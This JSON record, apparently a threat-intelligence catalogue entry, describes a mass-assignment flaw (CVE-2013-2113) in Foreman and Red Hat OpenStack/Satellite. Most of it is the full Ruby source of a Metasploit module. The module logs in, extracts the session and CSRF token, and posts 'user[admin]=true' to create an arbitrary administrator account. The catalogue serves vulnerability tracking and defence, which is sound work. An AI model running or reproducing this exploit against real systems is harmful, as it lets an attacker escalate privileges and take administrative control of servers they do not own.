{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--87723f3b-633d-49a4-891c-848013099c1b",
    "created": "2024-08-14T16:23:48.6991Z",
    "modified": "2024-08-14T16:23:48.699104Z",
    "name": "Foreman (Red Hat OpenStack/Satellite) users/create Mass Assignment",
    "description": " This module exploits a mass assignment vulnerability in the 'create' action of 'users' controller of Foreman and Red Hat OpenStack/Satellite (Foreman 1.2.0-RC1 and earlier) by creating an arbitrary administrator account. For this exploit to work, your account must have 'create_users' permission (e.g., Manager role). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/foreman_openstack_satellite_priv_esc.rb",
            "external_id": "foreman_openstack_satellite_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2113"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=966804"
        },
        {
            "source_name": "reference",
            "url": "https://projects.theforeman.org/issues/2630"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize\n    super(\n      'Name' => 'Foreman (Red Hat OpenStack/Satellite) users/create Mass Assignment',\n      'Description' => %q{\n          This module exploits a mass assignment vulnerability in the 'create'\n        action of 'users' controller of Foreman and Red Hat OpenStack/Satellite\n        (Foreman 1.2.0-RC1 and earlier) by creating an arbitrary administrator\n        account. For this exploit to work, your account must have 'create_users'\n        permission (e.g., Manager role).\n      },\n      'Author' => 'Ramon de C Valle',\n      'License' => MSF_LICENSE,\n      'References' => [\n        ['BID', '60835'],\n        ['CVE', '2013-2113'],\n        ['CWE', '915'],\n        ['OSVDB', '94655'],\n        ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=966804'],\n        ['URL', 'https://projects.theforeman.org/issues/2630']\n      ],\n      'DisclosureDate' => 'Jun 6 2013'\n    )\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n        OptString.new('USERNAME', [true, 'Your username']),\n        OptString.new('PASSWORD', [true, 'Your password']),\n        OptString.new('NEWUSERNAME', [true, 'The username of the new admin account']),\n        OptString.new('NEWPASSWORD', [true, 'The password of the new admin account']),\n        OptString.new('NEWEMAIL', [true, 'The email of the new admin account']),\n        OptString.new('TARGETURI', [ true, 'The path to the application', '/']),\n      ], self.class\n    )\n  end\n\n  def run\n    print_status(\"Logging into #{target_url}...\")\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'users', 'login'),\n      'vars_post' => {\n        'login[login]' => datastore['USERNAME'],\n        'login[password]' => datastore['PASSWORD']\n      }\n    )\n\n    if res.nil?\n      print_error('No response from remote host')\n      return\n    end\n\n    if res.headers['Location'] =~ %r{users/login$}\n      print_error('Authentication failed')\n      return\n    else\n      session = ::Regexp.last_match(1) if res.get_cookies =~ /_session_id=([0-9a-f]*)/\n\n      if session.nil?\n        print_error('Failed to retrieve the current session id')\n        return\n      end\n    end\n\n    print_status('Retrieving the CSRF token for this session...')\n    res = send_request_cgi(\n      'cookie' => \"_session_id=#{session}\",\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri)\n    )\n\n    if res.nil?\n      print_error('No response from remote host')\n      return\n    end\n\n    if res.headers['Location'] =~ %r{users/login$}\n      print_error('Failed to retrieve the CSRF token')\n      return\n    else\n      csrf_param = ::Regexp.last_match(1) if res.body =~ %r{<meta +content=\"(.*)\" +name=\"csrf-param\" */?>}i\n      csrf_token = ::Regexp.last_match(1) if res.body =~ %r{<meta +content=\"(.*)\" +name=\"csrf-token\" */?>}i\n\n      if csrf_param.nil? || csrf_token.nil?\n        csrf_param = ::Regexp.last_match(1) if res.body =~ %r{<meta +name=\"csrf-param\" +content=\"(.*)\" */?>}i\n        csrf_token = ::Regexp.last_match(1) if res.body =~ %r{<meta +name=\"csrf-token\" +content=\"(.*)\" */?>}i\n      end\n\n      if csrf_param.nil? || csrf_token.nil?\n        print_error('Failed to retrieve the CSRF token')\n        return\n      end\n    end\n\n    print_status(\"Sending create-user request to #{target_url('users')}...\")\n    res = send_request_cgi(\n      'cookie' => \"_session_id=#{session}\",\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'users'),\n      'vars_post' => {\n        csrf_param => csrf_token,\n        'user[admin]' => 'true',\n        'user[auth_source_id]' => '1',\n        'user[login]' => datastore['NEWUSERNAME'],\n        'user[mail]' => datastore['NEWEMAIL'],\n        'user[password]' => datastore['NEWPASSWORD'],\n        'user[password_confirmation]' => datastore['NEWPASSWORD']\n      }\n    )\n\n    if res.nil?\n      print_error('No response from remote host')\n      return\n    end\n\n    if res.headers['Location'] =~ /users$/\n      print_good('User created successfully')\n    else\n      print_error('Failed to create user')\n    end\n  end\n\n  def target_url(*args)\n    (ssl ? 'https' : 'http') +\n      if rport.to_i == 80 || rport.to_i == 443\n        \"://#{vhost}\"\n      else\n        \"://#{vhost}:#{rport}\"\n      end + normalize_uri(target_uri.path, *args)\n  end\nend\n",
    "x_mitre_disclosure_date": "Jun 6 2013"
}